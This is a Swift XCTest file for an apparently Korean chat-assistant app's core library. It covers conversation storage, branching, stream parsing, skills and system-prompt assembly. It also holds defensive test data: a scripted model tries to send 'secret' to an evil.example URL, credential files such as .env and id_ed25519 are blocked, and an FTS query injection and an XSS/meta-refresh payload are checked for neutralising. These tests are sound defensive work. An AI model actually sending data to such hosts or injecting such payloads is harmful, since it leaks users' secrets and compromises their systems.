import XCTest
@testable import SillogCore

final class ChatTests: XCTestCase {
    func testPlainTextStripsMarkdownMarkers() {
        let markdown = "## 요약\n\n- **굵게** 와 __밑줄__\n1. `code` 링크 [문서](https://a.b/c) [S1]\n> 인용\n```swift\nlet x = 1\n```"
        XCTAssertEqual(ConversationMessage.plainText(markdown), "요약 굵게 와 밑줄 code 링크 문서 [S1] 인용 let x = 1")
    }

    func testConnectorRenamePreservesSavedScopes() throws {
        let saved = Data(#"{"plugins":["gmail","figma"],"useWeb":false,"useGitHub":true}"#.utf8)
        let scope = try JSONDecoder().decode(ChatScope.self, from: saved)
        XCTAssertEqual(scope.connectors, ["gmail", "figma"])
        XCTAssertTrue(scope.useGitHub)
        XCTAssertFalse(scope.useWeb)
        let encoded = try JSONEncoder().encode(scope)
        let stored = try XCTUnwrap(JSONSerialization.jsonObject(with: encoded) as? [String: Any])
        XCTAssertEqual(stored["plugins"] as? [String], ["gmail", "figma"])
        XCTAssertEqual(try JSONDecoder().decode(ChatScope.self, from: encoded), scope)
    }

    /// Args: 없음.
    /// Returns: 없음. 이름 변경 저장과 대상 대화의 메시지 삭제를 확인한다.
    /// Raises: 테스트 DB 오류.
    func testRenameAndDeleteConversation() throws {
        let store = ChatStore(try .inMemory()), conversation = ChatConversation(), other = ChatConversation()
        try store.startTurn(conversation: conversation,
                            user: .init(conversationID: conversation.id, role: "user", text: "요청"),
                            answer: .init(conversationID: conversation.id, role: "assistant", text: "결과"))
        try store.save(other)
        try store.renameConversation(conversation.id, title: "바꾼 이름")
        XCTAssertEqual(try store.conversations().first(where: { $0.id == conversation.id })?.title, "바꾼 이름")
        try store.deleteConversation(conversation.id)
        XCTAssertTrue(try store.messages(conversation.id).isEmpty)
        XCTAssertEqual(try store.conversations().map(\.id), [other.id])
    }

    /// Args: 없음.
    /// Returns: 없음. 중단된 응답 복구와 외부 도구 대화와의 저장 분리를 확인한다.
    /// Raises: 테스트 DB 오류.
    func testConversationPersistenceAndRecovery() throws {
        let db = try SillogDatabase.inMemory(), store = ChatStore(db), conversation = ChatConversation()
        let user = ConversationMessage(conversationID: conversation.id, role: "user", text: "요청")
        let answer = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "일부 응답", status: "running")
        try store.startTurn(conversation: conversation, user: user, answer: answer)
        try store.recoverInterruptedRuns()
        XCTAssertEqual(try store.messages(conversation.id).map(\.status), ["complete", "interrupted"])
        XCTAssertEqual(try EventStore(db).chatMessages(from: 0, to: Date().timeIntervalSince1970).count, 0)
    }

    func testARunStoredInEnglishIsMarkedInterrupted() throws {
        let db = try SillogDatabase.inMemory(), store = ChatStore(db)
        var job = ChatAutomation(proposal: .init(title: "t", prompt: "p", intervalHours: 1), conversation: ChatConversation(), now: 0)
        job.lastStatus = "Running"
        try store.save(job)
        try store.recoverInterruptedRuns()
        XCTAssertEqual(try store.automations().first?.lastStatus, "앱 종료로 중단됨")
    }

    /// Args: 없음.
    /// Returns: 없음. 짧은 한국어·FTS 검색·연결 노드 조회를 확인한다.
    /// Raises: 테스트 DB 오류.
    func testContextSearchAndGraphExpansion() throws {
        let db = try SillogDatabase.inMemory()
        let node = try db.writer.write { conn in
            let tx = GraphTx(conn)
            let task = try tx.upsertNode(label: "Task", key: "test-task", subtype: nil, title: "문서 검색 구현", props: [:], at: 10)
            let project = try tx.upsertNode(label: "Project", key: "test-project", subtype: nil, title: "설계 자료", props: [:], at: 10)
            _ = try tx.upsertEdge(src: task, dst: project, type: "ON", props: [:], addWeight: 0, at: 10)
            return task
        }
        let search = ContextSearch(db)
        XCTAssertFalse(try search.search(query: "문서").isEmpty)
        XCTAssertFalse(try search.search(query: "문서 검색 구현").isEmpty)
        XCTAssertFalse(try search.search(query: "test-task").isEmpty)
        XCTAssertEqual(try search.read("node:\(node)").count, 2)
        XCTAssertTrue(try search.search(query: "\" OR *").isEmpty)
    }

    /// Args: 없음.
    /// Returns: 없음. 연결 범위 밖·심볼릭 링크·인증 파일 접근 차단을 확인한다.
    /// Raises: 임시 파일·DB 오류.
    func testFileScope() throws {
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: directory) }
        try FileManager.default.createSymbolicLink(at: directory.appendingPathComponent("outside"), withDestinationURL: directory.deletingLastPathComponent())
        var scope = ChatScope(); scope.paths = [directory.path]
        let tools = ChatTools(db: try .inMemory(), scope: scope)
        XCTAssertNoThrow(try tools.allowedURL(directory.appendingPathComponent("Sources/App.swift").path))
        XCTAssertThrowsError(try tools.allowedURL(directory.appendingPathComponent(".env").path))
        XCTAssertThrowsError(try tools.allowedURL(directory.appendingPathComponent("outside/secret.txt").path))
        XCTAssertThrowsError(try tools.allowedURL(directory.path + "-other/file.txt"))
    }

    /// Args: 없음.
    /// Returns: 이전 통합 외부 조회 설정을 보존하고 웹·GitHub 도구가 독립적으로 노출되는지 확인한다.
    /// Raises: JSON·테스트 DB 오류.
    func testSeparateExternalSources() throws {
        let saved = Data(#"{"paths":[],"useActivity":true,"useWeb":true}"#.utf8)
        let migrated = try JSONDecoder().decode(ChatScope.self, from: saved)
        XCTAssertTrue(migrated.useWeb)
        XCTAssertTrue(migrated.useGitHub)

        var scope = ChatScope()
        scope.useGitHub = true
        let github = ChatTools(db: try .inMemory(), scope: scope, searchKey: "search-key", searchModel: "test-model")
        XCTAssertTrue(github.specs.contains { $0.name == "github_read" })
        XCTAssertFalse(github.specs.contains { $0.name == "web_search" })

        scope.useGitHub = false
        scope.useWeb = true
        let web = ChatTools(db: try .inMemory(), scope: scope, searchKey: "search-key", searchModel: "test-model")
        XCTAssertTrue(web.specs.contains { $0.name == "web_search" })
        XCTAssertFalse(web.specs.contains { $0.name == "github_read" })

        scope.connectors = ["gmail", "drive", "notion"]
        let connectors = ChatTools(db: try .inMemory(), scope: scope)
        XCTAssertTrue(connectors.specs.contains { $0.name == "gmail_search" })
        XCTAssertTrue(connectors.specs.contains { $0.name == "drive_read" })
        XCTAssertTrue(connectors.specs.contains { $0.name == "notion_search" })
    }

    /// Args: 없음.
    /// Returns: 없음. 미완료 도구 호출은 실행 가능한 응답으로 반환되지 않음을 확인한다.
    /// Raises: JSON 해석 오류.
    func testStreamRequiresCompletion() throws {
        var parser = ChatStreamParser(format: .completions)
        _ = try parser.accept(#"{"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"read_file","arguments":"{\"path\":"}}]},"finish_reason":null}]}"#)
        XCTAssertThrowsError(try parser.result())
        _ = try parser.accept(#"{"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"\"a\"}"}}]},"finish_reason":"tool_calls"}]}"#)
        XCTAssertEqual(try parser.result().calls.first?.arguments, #"{"path":"a"}"#)
        var responses = ChatStreamParser(format: .responses)
        _ = try responses.accept(#"{"type":"response.completed","response":{"status":"completed","output":[{"type":"reasoning","encrypted_content":"opaque"},{"type":"function_call","call_id":"c1","name":"read_file","arguments":"{}"}]}}"#)
        XCTAssertEqual(try responses.result().responseItems.count, 2)
    }

    /// Args: 없음.
    /// Returns: 없음. 마지막 output이 비어 있어도 완료 항목의 도구·reasoning을 보존한다.
    /// Raises: SSE 해석 오류.
    func testResponsesKeepsCompletedItemsWhenFinalOutputIsEmpty() throws {
        var parser = ChatStreamParser(format: .responses)
        _ = try parser.accept(#"{"type":"response.output_item.done","output_index":0,"item":{"type":"reasoning","id":"r1","encrypted_content":"opaque"}}"#)
        _ = try parser.accept(#"{"type":"response.output_item.done","output_index":1,"item":{"type":"function_call","id":"f1","call_id":"c1","name":"search_context","arguments":"{}","status":"completed"}}"#)
        XCTAssertThrowsError(try parser.result())
        _ = try parser.accept(#"{"type":"response.completed","response":{"status":"completed","output":[]}}"#)
        XCTAssertEqual(try parser.result().calls.first?.name, "search_context")
        XCTAssertEqual(try parser.result().responseItems.count, 2)
        var text = ChatStreamParser(format: .responses)
        _ = try text.accept(#"{"type":"response.output_item.done","output_index":0,"item":{"type":"message","role":"assistant","content":[{"type":"output_text","text":"완료"}]}}"#)
        _ = try text.accept(#"{"type":"response.completed","response":{"status":"completed","output":[]}}"#)
        XCTAssertEqual(try text.result().text, "완료")
    }

    /// Args: 없음.
    /// Returns: 없음. 네트워크 스트림의 빈 줄 구분과 실제 본문 콜백을 확인한다.
    /// Raises: 모의 HTTP·스트림 오류.
    func testNetworkStreamAndToolHistory() async throws {
        StubURLProtocol.reset([.init(status: 200, body: """
            data: {"choices":[{"delta":{"content":"안녕"},"finish_reason":null}]}

            data: {"choices":[{"delta":{"content":"하세요"},"finish_reason":"stop"}]}


            """)])
        let config = URLSessionConfiguration.ephemeral; config.protocolClasses = [StubURLProtocol.self]
        let client = OpenAICompatClient(baseURL: URL(string: "https://example.invalid/v1")!, model: "test", session: URLSession(configuration: config))
        let reply = try await client.respond(system: "test", messages: [
            .init(role: "user", text: "질문"),
            .init(role: "assistant", text: "", calls: [.init(id: "c1", name: "read_file", arguments: "{}")]),
            .init(role: "tool", text: "결과", callID: "c1"),
        ], tools: []) { _ in }
        XCTAssertEqual(reply.text, "안녕하세요")
        let sent = StubURLProtocol.requests.first?.body["messages"] as? [[String: Any]]
        XCTAssertEqual(sent?.last?["tool_call_id"] as? String, "c1")
    }

    func testOldMessagesDecodeWithoutModelOrEarlierAnswers() throws {
        let old = #"{"id":"m","conversationID":"c","role":"assistant","text":"답","status":"complete","createdAt":1,"sources":[],"artifacts":[],"steps":[]}"#
        let message = try JSONDecoder().decode(ConversationMessage.self, from: Data(old.utf8))
        XCTAssertNil(message.model)
        XCTAssertNil(message.effort)
        XCTAssertNil(message.previous)
        XCTAssertEqual(message.versions.map(\.id), ["m"])
        var answer = message; answer.effort = "xhigh"
        XCTAssertEqual(try JSONDecoder().decode(ConversationMessage.self, from: JSONEncoder().encode(answer)).effort, "xhigh")
        let withEffort = old.replacingOccurrences(of: #""steps":[]"#, with: #""steps":[],"effort":"medium""#)
        XCTAssertEqual(try JSONDecoder().decode(ConversationMessage.self, from: Data(withEffort.utf8)).effort, "medium")
    }

    func testEditAndRegenerateReplaceFromTheQuestion() throws {
        let store = ChatStore(try .inMemory()), conversation = ChatConversation()
        let q1 = ConversationMessage(conversationID: conversation.id, role: "user", text: "첫 질문")
        let a1 = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "첫 답")
        let q2 = ConversationMessage(conversationID: conversation.id, role: "user", text: "둘째 질문")
        let a2 = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "둘째 답")
        try store.startTurn(conversation: conversation, user: q1, answer: a1)
        try store.startTurn(conversation: conversation, user: q2, answer: a2)
        let all = try store.messages(conversation.id)
        XCTAssertEqual(ConversationMessage.replaced(from: a2, in: all).map(\.id), [q2.id, a2.id])
        XCTAssertEqual(ConversationMessage.replaced(from: q1, in: all).map(\.id), [q1.id, a1.id, q2.id, a2.id])
        XCTAssertEqual(ConversationMessage.replaced(from: a1, in: all).map(\.id), [q1.id, a1.id, q2.id, a2.id])
        let q3 = ConversationMessage(conversationID: conversation.id, role: "user", text: "둘째 질문")
        let a3 = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "", status: "running")
        try store.startTurn(conversation: conversation, user: q3, answer: a3, replacing: ConversationMessage.replaced(from: a2, in: all))
        XCTAssertEqual(try store.messages(conversation.id).map(\.id), [q1.id, a1.id, q3.id, a3.id])
    }

    func testEditingAQuestionKeepsTheOldPathAsABranchToSwitchBackTo() throws {
        let store = ChatStore(try .inMemory()), conversation = ChatConversation()
        let q1 = ConversationMessage(conversationID: conversation.id, role: "user", text: "첫 질문")
        let a1 = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "첫 답")
        let q2 = ConversationMessage(conversationID: conversation.id, role: "user", text: "둘째 질문")
        let a2 = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "둘째 답")
        try store.startTurn(conversation: conversation, user: q1, answer: a1)
        try store.startTurn(conversation: conversation, user: q2, answer: a2)
        let old = try store.messages(conversation.id)
        let replaced = ConversationMessage.replaced(from: q1, in: old)
        var edited = ConversationMessage(conversationID: conversation.id, role: "user", text: "고친 질문")
        edited.branch(replacing: replaced)
        let answer = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "새 답")
        try store.startTurn(conversation: conversation, user: edited, answer: answer, replacing: replaced)

        let active = try store.messages(conversation.id)
        XCTAssertEqual(active.map(\.id), [edited.id, answer.id], "only the active path is stored as rows, so search and export see just it")
        XCTAssertEqual(active[0].branches?.first?.map(\.id), [q1.id, a1.id, q2.id, a2.id])
        let paths = ConversationMessage.paths(at: active[0], in: active)
        XCTAssertEqual(paths.paths.map { $0[0].text }, ["첫 질문", "고친 질문"])
        XCTAssertEqual(paths.active, 1)

        let switched = try XCTUnwrap(ConversationMessage.switching(active[0], to: 0, in: active))
        try store.replaceMessages(in: conversation.id, removing: active, inserting: switched)
        let restored = try store.messages(conversation.id)
        XCTAssertEqual(restored.map(\.id), [q1.id, a1.id, q2.id, a2.id])
        XCTAssertEqual(restored[0].branches?.map { $0.map(\.id) }, [[edited.id, answer.id]])
        XCTAssertEqual(ConversationMessage.paths(at: restored[0], in: restored).active, 0)
        XCTAssertNil(ConversationMessage.switching(restored[0], to: 2, in: restored))

        // Regenerating keeps the branches and the asking time, so the order of the paths holds.
        var resent = ConversationMessage(conversationID: conversation.id, role: "user", text: "첫 질문")
        resent.branch(replacing: ConversationMessage.replaced(from: restored[1], in: restored))
        XCTAssertEqual(resent.createdAt, q1.createdAt)
        XCTAssertEqual(resent.branches?.count, 1)

        var plain = ConversationMessage(conversationID: conversation.id, role: "user", text: "x")
        plain.branch(replacing: [])
        XCTAssertNil(plain.branches)
        var many = old[0]
        many.branches = (0..<12).map { _ in [ConversationMessage(conversationID: conversation.id, role: "user", text: "q")] }
        var capped = ConversationMessage(conversationID: conversation.id, role: "user", text: "y")
        capped.branch(replacing: [many])
        XCTAssertEqual(capped.branches?.count, 9)
        XCTAssertEqual(capped.branches?.last?.first?.id, many.id, "the path just replaced is never the one dropped")
    }

    /// Args: 없음.
    /// Returns: 없음. 예약 승인 저장과 문서 출력의 스크립트 차단을 확인한다.
    /// Raises: 테스트 DB 오류.
    func testAutomationApprovalAndArtifactHTML() throws {
        let store = ChatStore(try .inMemory()), conversation = ChatConversation()
        let user = ConversationMessage(conversationID: conversation.id, role: "user", text: "반복 요청")
        var answer = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "예약안")
        let proposal = ChatAutomationProposal(title: "보고서", prompt: "지난 하루를 요약", intervalHours: 24)
        answer.automation = proposal
        try store.startTurn(conversation: conversation, user: user, answer: answer)
        XCTAssertTrue(try store.automations().isEmpty)
        let job = ChatAutomation(proposal: proposal, conversation: conversation, now: 0)
        answer.approvedAutomationID = job.id
        try store.approve(job, message: answer)
        XCTAssertEqual(try store.automations().first?.nextRun, 86400)
        XCTAssertEqual(try store.messages(conversation.id).last?.approvedAutomationID, job.id)
        try store.deleteAutomation(job.id)
        XCTAssertTrue(try store.automations().isEmpty)
        XCTAssertNil(try store.messages(conversation.id).last?.approvedAutomationID)
        XCTAssertEqual(try store.conversations().first?.id, conversation.id)
        let html = ChatArtifactHTML.render(.init(title: "문서", format: "html", content: "<script>alert(1)</script><meta http-equiv='refresh' content='0;url=https://example.invalid'><h1>결과</h1>"))
        XCTAssertFalse(html.contains("<script>"))
        XCTAssertFalse(html.contains("http-equiv='refresh'"))
        XCTAssertTrue(html.contains("script-src 'none'"))
        let csv = ChatArtifactHTML.render(.init(title: "표", format: "csv", content: "항목,값\nA,<B>"))
        XCTAssertTrue(csv.contains("<td>항목</td><td>값</td>"))
        XCTAssertTrue(csv.contains("<td>&lt;B&gt;</td>"))
        let json = ChatArtifactHTML.render(.init(title: "데이터", format: "json", content: #"{"value":"<B>"}"#))
        XCTAssertTrue(json.contains("&quot;value&quot;: &quot;&lt;B&gt;&quot;"))
        let pretty = ChatArtifactHTML.render(.init(title: "d", format: "json", content: #"{"a":1,"b":[2]}"#))
        let pre = pretty.components(separatedBy: "<pre>").last?.components(separatedBy: "</pre>").first ?? ""
        XCTAssertTrue(pre.contains("\n"))
        let broken = ChatArtifactHTML.render(.init(title: "d", format: "json", content: "{oops"))
        XCTAssertTrue(broken.contains("<pre>{oops</pre>"))
        XCTAssertTrue(ChatArtifactHTML.render(.init(title: "d", format: "json", content: "42")).contains("<pre>42</pre>"))
        let exact = ChatArtifactHTML.render(.init(title: "d", format: "json", content: #"{"zeta":1,"alpha":19.90,"dup":1,"dup":2,"e":{},"s":"a, {b}: \"c\""}"#))
        XCTAssertTrue(exact.contains("{\n  &quot;zeta&quot;: 1,\n  &quot;alpha&quot;: 19.90,\n  &quot;dup&quot;: 1,\n  &quot;dup&quot;: 2,\n  &quot;e&quot;: {},\n  &quot;s&quot;: &quot;a, {b}: \\&quot;c\\&quot;&quot;\n}"), exact)
        let md = { (text: String) in ChatArtifactHTML.render(.init(title: "m", format: "markdown", content: text)) }
        XCTAssertTrue(md("1. a\n2. b").contains("<ol><li>a</li><li>b</li></ol>"))
        let split = md("1. a\n   - x\n2. b\n\n3. c")
        XCTAssertTrue(split.contains("<ol start=\"2\"><li>b</li>") && split.contains("<ol start=\"3\"><li>c</li>"), split)
        let starred = md("`*.swift` and `*.md`")
        XCTAssertTrue(starred.contains("<code>*.swift</code> and <code>*.md</code>") && !starred.contains("<em>"), starred)
        XCTAssertTrue(md("---").contains("<hr>"))
        XCTAssertTrue(md("* * *").contains("<hr>"))
        XCTAssertTrue(md("*x*").contains("<em>x</em>"))
        XCTAssertFalse(md("5 * 3 * 2").contains("<em>"))
        XCTAssertTrue(md("**b**").contains("<strong>b</strong>"))
        XCTAssertFalse(md("**b**").contains("<em>"))
    }

    /// Args: 없음.
    /// Returns: Markdown 표와 일반 문장을 구별하고 셀 내용을 보존한다.
    /// Raises: 없음.
    func testMarkdownTable() {
        XCTAssertEqual(ChatMarkdownTable.rows(in: "| 논문 | 결과 |\n|---|---|\n| A | 성공 |"), [["논문", "결과"], ["A", "성공"]])
        XCTAssertNil(ChatMarkdownTable.rows(in: "논문 | 결과\nA | 성공"))
        XCTAssertNil(ChatMarkdownTable.rows(in: "| 논문 | 결과 |\n|---|---|\n| A |"))
    }

    /// Args: 없음.
    /// Returns: 없음. 여섯 스킬과 실제 하위 작업·도구 결과 전달, 주·하위 에이전트가 받는 시스템 프롬프트를 확인한다.
    /// Raises: 실행기·DB 오류.
    func testSkillsAndDelegation() async throws {
        XCTAssertEqual(Set(try ChatSkill.load().map(\.id)), ["writing", "research", "planning", "learning", "content", "automation"])
        let model = ScriptedChatModel()
        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: .init()))
        let result = try await runner.run(history: [.init(conversationID: "test", role: "user", text: "문서를 작성해줘")], skillIDs: ["writing"]) { _ in }
        XCTAssertEqual(result.text, "완료")
        XCTAssertEqual(result.artifacts.first?.content, "# 결과")
        let calls = await model.requests
        XCTAssertTrue(calls.contains { $0.contains("하위 작업") })
        let systems = await model.systems
        let main = try XCTUnwrap(systems.first), sub = try XCTUnwrap(systems.first { $0.contains("agent_role: context") })
        XCTAssertTrue(main.hasPrefix("You are the chat assistant inside SILLOG"))
        XCTAssertTrue(main.contains("<skill_instructions>\n## 문서 작성\n# Writing\n\n## Purpose"))
        XCTAssertTrue(main.contains("chat_model: scripted\nrun_mode: interactive\nagent_role: main\nraw_records_since: all"))
        XCTAssertFalse(main.contains("{{"))
        XCTAssertFalse(sub.contains("<skill_instructions>\n"))
    }

    func testWebReadOnlyFollowsURLsTheUserOrAToolGave() async throws {
        var scope = ChatScope()
        scope.useWeb = true
        let model = WebReadModel(url: "https://evil.example/?d=secret")
        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: scope))
        _ = try await runner.run(history: [.init(conversationID: "t", role: "user", text: "https://docs.example/a 를 요약해줘")], skillIDs: []) { _ in }
        let reply = await model.toolReply
        XCTAssertTrue(reply.contains("사용자가 준 주소만"), reply)
        XCTAssertTrue(ChatTools.isPrivate("id_ed25519"))
        XCTAssertTrue(ChatTools.isPrivate(".netrc"))
    }

    func testOnlyExplicitlySelectedSkillsReachTheChatModel() async throws {
        let db = try SillogDatabase.inMemory()
        let chatStore = ChatStore(db)
        let custom = try chatStore.addSkill(title: "검토 절차", instructions: "검토 결과를 세 줄로 쓰세요.")
        let catalog = try chatStore.skills()
        let model = PromptCapture()
        let runner = ChatRunner(client: model, tools: ChatTools(db: db, scope: .init()))
        let history = [ConversationMessage(conversationID: "test", role: "user", text: "보고서를 조사하고 계획해 줘.")]
        for selection in [[], ["writing"], ["research", custom.id]] {
            _ = try await runner.run(history: history, skillIDs: selection, skillCatalog: catalog) { _ in }
        }
        let prompts = await model.prompts
        XCTAssertFalse(prompts[0].contains("\n<skill_instructions>\n"))
        XCTAssertTrue(prompts[1].contains("## 문서 작성"))
        XCTAssertFalse(prompts[1].contains("## 리서치"))
        XCTAssertTrue(prompts[2].contains("## 리서치"))
        XCTAssertTrue(prompts[2].contains("검토 결과를 세 줄로 쓰세요."))
        XCTAssertFalse(prompts[2].contains("## 문서 작성"))
    }

    func testSkillEditsAndDeletionsPersistForBundledAndCustomSkills() async throws {
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString, isDirectory: true)
        defer { try? FileManager.default.removeItem(at: directory) }
        let path = directory.appendingPathComponent("chat.sqlite").path
        let store = ChatStore(try SillogDatabase(path: path))
        let bundled = try XCTUnwrap(store.skills().first)
        let custom = try store.addSkill(title: "초안", instructions: "초안 지침", summary: "설명")
        _ = try store.updateSkill(custom, title: "내 스킬", instructions: "내 스킬의 수정 지침", summary: "수정 설명")
        _ = try store.updateSkill(bundled, title: "기본 스킬 수정", instructions: "기본 스킬의 수정 지침", summary: "기본 설명 수정")

        let reopened = try SillogDatabase(path: path)
        let reopenedStore = ChatStore(reopened)
        let saved = try reopenedStore.skills()
        let savedBundled = try XCTUnwrap(saved.first { $0.id == bundled.id })
        let savedCustom = try XCTUnwrap(saved.first { $0.id == custom.id })
        XCTAssertFalse(savedBundled.isCustom)
        XCTAssertTrue(savedCustom.isCustom)
        XCTAssertEqual(savedCustom.title, "내 스킬")
        XCTAssertEqual(savedCustom.summary, "수정 설명")
        XCTAssertEqual(try savedBundled.instructions(), "기본 스킬의 수정 지침")

        let model = PromptCapture()
        let runner = ChatRunner(client: model, tools: ChatTools(db: reopened, scope: .init()))
        let history = [ConversationMessage(conversationID: "test", role: "user", text: "기획서를 만들어 줘.")]
        let chosen = [bundled.id, custom.id]
        _ = try await runner.run(history: history, skillIDs: chosen, skillCatalog: saved) { _ in }

        try reopenedStore.deleteSkill(savedBundled)
        try reopenedStore.deleteSkill(savedCustom)
        XCTAssertThrowsError(try store.updateSkill(bundled, title: "복원", instructions: "지침", summary: ""))
        XCTAssertThrowsError(try store.updateSkill(custom, title: "복원", instructions: "지침", summary: ""))
        let afterDelete = try ChatStore(SillogDatabase(path: path)).skills()
        XCTAssertFalse(afterDelete.contains { chosen.contains($0.id) })
        XCTAssertEqual(afterDelete.count, try ChatSkill.load().count - 1)

        _ = try await runner.run(history: history, skillIDs: chosen, skillCatalog: afterDelete) { _ in }
        let prompts = await model.prompts
        XCTAssertTrue(prompts[0].contains("기본 스킬의 수정 지침"))
        XCTAssertTrue(prompts[0].contains("내 스킬의 수정 지침"))
        XCTAssertFalse(prompts[1].contains("\n<skill_instructions>\n"))
    }

    func testExternalConnectorToolsRequireExplicitScope() throws {
        var scope = ChatScope()
        scope.connectors = ["figma", "discord"]
        let db = try SillogDatabase.inMemory()
        let names = Set(ChatTools(db: db, scope: scope).specs.map(\.name))
        XCTAssertTrue(Set(["figma_search", "figma_read", "discord_search", "discord_read"]).isSubset(of: names))
        XCTAssertFalse(names.contains("slack_search"))
        XCTAssertFalse(names.contains("canva_read"))
    }

    /// Args: 없음.
    /// Returns: 없음. 실행 정보 블록을 채우고, 하위 에이전트에는 스킬·프로젝트·기억 자료 블록을 빼는지 확인한다.
    /// Raises: 리소스 읽기 오류.
    func testSystemPromptFillsRuntimeBlocks() throws {
        var scope = ChatScope(); scope.paths = ["/tmp/a", "/tmp/b"]; scope.useWeb = true; scope.useGitHub = true; scope.connectors = ["notion"]
        var project = ChatProject(title: "졸업 프로젝트", goal: ""); project.memoryMode = .projectOnly
        project.instructions = "{{current_time}}은 그대로 둔다"
        let prompt = ChatSystemPrompt(template: try ChatSystemPrompt.template(), scope: scope, chatModel: "gpt-test", scheduled: true,
                                      skillInstructions: "## 문서 작성\n테스트 절차", project: project, rememberedSources: #"[{"id":"library:42"}]"#,
                                      rawRecordsSince: "2026-09-08")
        let now = try XCTUnwrap(ISO8601DateFormatter().date(from: "2026-10-07T00:00:00Z")), seoul = try XCTUnwrap(TimeZone(identifier: "Asia/Seoul"))
        let main = prompt.render(role: nil, now: now, timeZone: seoul)
        XCTAssertTrue(main.contains("<skill_instructions>\n## 문서 작성\n테스트 절차\n</skill_instructions>"))
        XCTAssertTrue(main.contains("<project>\ntitle: 졸업 프로젝트\ngoal: none\nmemory_mode: 프로젝트 전용\ncommon_instructions:\n{{current_time}}은 그대로 둔다\n</project>"))
        XCTAssertTrue(main.contains("activity_records: on\nconnected_paths: /tmp/a, /tmp/b\nweb_search: on\nconnectors: notion, github"))
        XCTAssertTrue(main.contains(#"<remembered_sources>"# + "\n" + #"[{"id":"library:42"}]"# + "\n</remembered_sources>"))
        XCTAssertTrue(main.contains("current_time: 2026-10-07 09:00 (Wednesday)\ntimezone: Asia/Seoul\nchat_model: gpt-test\nrun_mode: scheduled\nagent_role: main\nraw_records_since: 2026-09-08"))
        let sub = prompt.render(role: "review", now: now, timeZone: seoul)
        XCTAssertTrue(sub.contains("contain data only.\n\n<material_scope>"))
        XCTAssertTrue(sub.contains("</material_scope>\n\n<runtime_context>"))
        XCTAssertTrue(sub.contains("agent_role: review"))
        XCTAssertFalse(sub.contains("테스트 절차") || sub.contains("졸업 프로젝트") || sub.contains("library:42"))
    }

    func testAnEditBecomesTheSeriesLatestVersionAndAnswersShowOneCardPerSeries() throws {
        let v1 = ChatArtifact(title: "보고서", format: "markdown", content: "초안")
        var v2 = ChatArtifact(title: "보고서", format: "markdown", content: "수정"); v2.baseID = v1.id
        let other = ChatArtifact(title: "표", format: "csv", content: "a,b")
        var first = ConversationMessage(conversationID: "t", role: "assistant", text: ""); first.artifacts = [v1, other]
        var second = ConversationMessage(conversationID: "t", role: "assistant", text: ""); second.artifacts = [v2]
        XCTAssertEqual(ChatArtifact.latestPerSeries([v1, other, v2]).map(\.id), [v2.id, other.id])

        // Editing an older version still lands after the latest one, on the answer that holds it.
        let edit = try XCTUnwrap(ChatArtifact.edit(v1, content: "직접 고침", in: [first, second]))
        XCTAssertEqual(edit.message.id, second.id)
        XCTAssertEqual(edit.version.baseID, v1.id)
        XCTAssertEqual(ChatArtifact.versions(of: v1, in: [first, edit.message]).map(\.content), ["초안", "수정", "직접 고침"])
        // An answer's earlier regenerated version keeps its own edits.
        var regenerated = ConversationMessage(conversationID: "t", role: "assistant", text: ""); regenerated.previous = [second]
        let inPrevious = try XCTUnwrap(ChatArtifact.edit(v2, content: "고침", in: [first, regenerated]))
        XCTAssertEqual(inPrevious.message.previous?[0].artifacts.map(\.content), ["수정", "고침"])
        XCTAssertNil(ChatArtifact.edit(v1, content: "x", in: []))

        XCTAssertEqual(ChatArtifact.quote("  첫 줄\n둘째 줄 \n"), "> 첫 줄\n> 둘째 줄\n\n")
    }

    func testRevisedArtifactsJoinTheFirstVersionsSeries() async throws {
        var old = ConversationMessage(conversationID: "t", role: "assistant", text: "초안")
        old.artifacts = [ChatArtifact(title: "발표", format: "markdown", content: "# 초안")]
        let legacy = try JSONDecoder().decode(ChatArtifact.self, from: Data(#"{"id":"a","title":"t","format":"txt","content":"x"}"#.utf8))
        XCTAssertNil(legacy.baseID); XCTAssertEqual(legacy.seriesID, "a")
        XCTAssertFalse(String(decoding: try JSONEncoder().encode(legacy), as: UTF8.self).contains("baseID"))

        let id = old.artifacts[0].id
        let model = ArtifactCallModel(calls: [
            ##"{"title":"발표","format":"pptx","content":"# 1\n- a\n# 2","revises":"\##(id)"}"##,
            #"{"title":"다른 것","format":"xlsx","content":"a,b","revises":"없는-id"}"#,
            #"{"title":"x","format":"pdf","content":"x"}"#,
        ])
        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: .init()))
        let history = [ConversationMessage(conversationID: "t", role: "user", text: "발표 만들어줘"), old, ConversationMessage(conversationID: "t", role: "user", text: "고쳐줘")]
        let emitted = EventBox()
        let result = try await runner.run(history: history, skillIDs: []) { if case .artifact(let a) = $0 { await emitted.add(a) } }
        XCTAssertEqual(result.artifacts.map(\.baseID), [id, nil])
        let events = await emitted.items
        XCTAssertEqual(events, result.artifacts)
        let replies = await model.replies
        XCTAssertTrue(replies[2].contains("도구 실행 실패"), replies[2])
        let sent = await model.firstRequest
        XCTAssertTrue(sent.contains("<previous_artifact id=\"\(id)\" format=\"markdown\""), sent)

        var answer = ConversationMessage(conversationID: "t", role: "assistant", text: "")
        answer.artifacts = result.artifacts
        let versions = ChatArtifact.versions(of: result.artifacts[0], in: [old, answer])
        XCTAssertEqual(versions.map(\.id), [id, result.artifacts[0].id])
        XCTAssertEqual(ChatArtifact.versions(of: result.artifacts[1], in: [old, answer]).count, 1)

        var regenerated = ConversationMessage(conversationID: "t", role: "assistant", text: "")
        regenerated.previous = [answer]
        XCTAssertEqual(ChatArtifact.versions(of: result.artifacts[0], in: [old, regenerated]).map(\.id), [id, result.artifacts[0].id],
                       "an artifact in an earlier answer version keeps its place in the series")
    }

